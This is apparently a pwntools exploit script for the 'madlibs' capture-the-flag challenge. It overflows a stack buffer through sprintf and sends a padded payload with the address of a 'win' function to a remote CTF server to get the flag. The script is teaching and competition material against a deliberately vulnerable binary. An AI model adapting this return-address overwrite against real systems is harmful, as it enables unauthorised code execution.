from pwn import *                                                                                               
                                                                                                                
#init                                                                                                           
                                                                                                                
e = ELF('./madlibs')                                                                                            
                                                                                                                
#p = process(e.path)                                                                                             
p = remote('madlibs.lit-ctf-2021-2-codelab.kctf.cloud', 1337) 

#vars                                                                                                           
                                                                                                                
win = e.sym['win']                                                                                              
                                                                                                                
log.info('Win adr: ' + hex(win))                                                                                
                                                                                                                
#exploit                                                                                                        
                                                                                                                
#sprintf overflows on stack so return to win                                                                    
                                                                                                                
p.sendlineafter('.', b'a' * 0x33 + p64(win))                                                                    
p.sendlineafter('.', b'a' * 0x38)                                                                               
                                                                                                                
p.recvuntil('flag:')                                                                                            
                                                                                                                
#pray for flag                                                                                                  
                                                                                                                
p.interactive() 
